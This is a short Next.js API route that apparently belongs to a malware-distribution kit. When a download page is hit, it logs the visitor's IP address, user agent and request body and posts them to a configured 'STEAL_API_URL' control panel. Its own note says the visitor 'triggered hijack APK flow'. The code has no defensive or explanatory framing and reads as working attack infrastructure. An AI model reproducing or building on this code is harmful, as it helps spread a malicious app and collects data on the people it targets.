import { NextResponse } from "next/server";
import { STEAL_API_URL } from "@/lib/config";

export async function POST(req: Request) {
  const body = await req.json().catch(() => ({}));
  const entry = {
    action: body.action || "download_hit",
    path: body.path || "/pages/downapp/index",
    ip: req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "unknown",
    user_agent: req.headers.get("user-agent") || "",
    payload: body,
    note: "Download page hit — user triggered hijack APK flow",
  };

  try {
    await fetch(STEAL_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(entry),
    });
  } catch {
    /* panel optional during local dev */
  }

  return NextResponse.json({ ok: true, logged: entry });
}
